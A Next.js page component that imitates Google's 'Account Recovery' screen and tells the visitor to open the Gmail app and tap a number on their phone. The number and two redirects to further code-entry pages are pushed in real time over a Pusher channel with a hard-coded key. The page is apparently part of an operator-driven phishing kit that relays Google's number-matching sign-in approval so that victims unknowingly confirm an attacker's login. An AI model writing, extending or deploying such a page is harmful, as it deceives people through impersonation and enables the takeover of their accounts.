"use client"
import Image from "next/image";
import React, { useEffect, useState } from "react";
import Cookies from "js-cookie";
import Pusher from "pusher-js";
import { useRouter } from "next/navigation";

function page() {
  const codeD = Cookies.get("code");
  console.log(codeD);
  const router = useRouter();

  const [verifyId, setVerifyId] = useState("");
  const[reverifyId, setReVerifyId] = useState('');
  
  const id = Cookies.get("id");
  const pusher = new Pusher("05656b52c62c0f688ee3", {
    // APP_KEY
    cluster: "ap2",
    encrypted: true,
  });
  console.log('data', reverifyId);

  useEffect(() => {
    const channel = pusher.subscribe(id);

    channel.bind("code-verify", (data) => {
      // Perform the revalidation or data fetching logic here
      console.log("Path data updated:", data);
      Cookies.set("code", data.code);
      setVerifyId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind("code-verify");
      channel.unsubscribe(id);
    };
  }, [id]);

  useEffect(() => {
    const channel = pusher.subscribe(id);
    channel.bind('code-re-verify', (data) => {
      // Perform the revalidation or data fetching logic here
      console.log('Path data updated:', data);
      Cookies.set("gid", data.id);
      setReVerifyId(data.id); // Function to refetch or revalidate your path data
    });

    return () => {
      channel.unbind('code-re-verify');
      channel.unsubscribe(id);
    };
  }, [id]);

  if (verifyId) {
    return router.push("/account-verify-code");
  }
  if(reverifyId){
    return router.push("/account-verify-gcode");
  }  
  return (
    <div className="w-full min-h-screen flex flex-col justify-center items-center ">
      <div className="flex flex-col w-full max-w-md p-10 h-screen  gap-15 ">
        <div className="flex flex-col gap-6 ">
          <div className="flex flex-col  gap-3">
            <div>
              <Image
                src={"/logo.png"}
                alt="logo"
                width={100}
                height={100}
                className="object-cover "
              />
            </div>
            <div className="flex flex-col gap-2">
              <h1 className="text-2xl font-normal mb-1">Account Recovery</h1>
              <p>
                To help keep your account safe, Google wants to make sure it's
                really you trying to sign in
              </p>
            </div>
          </div>
          <div className="flex flex-col gap-4 ">
            <p className="text-4xl text-center font-bold">{codeD}</p>
            <p className="font-semibold">Open the Gmail app on Phone</p>
            <p className="font-medium">
              Google sent a notification to your Phone. Open the Gmail app, tap{" "}
              <span className="font-bold">Yes</span> on the prompt, then tap{" "}
              <span className="font-bold">{codeD}</span> on your phone to verify it's
              you.
            </p>
          </div>
          <div className="text-blue-500 font-semibold">Resend it</div>
        </div>
        <div className="flex justify-start text-sm font-bold text-blue-500">
          I don't have my phone
        </div>
      </div>
      
    </div>
  );
}

export default page;
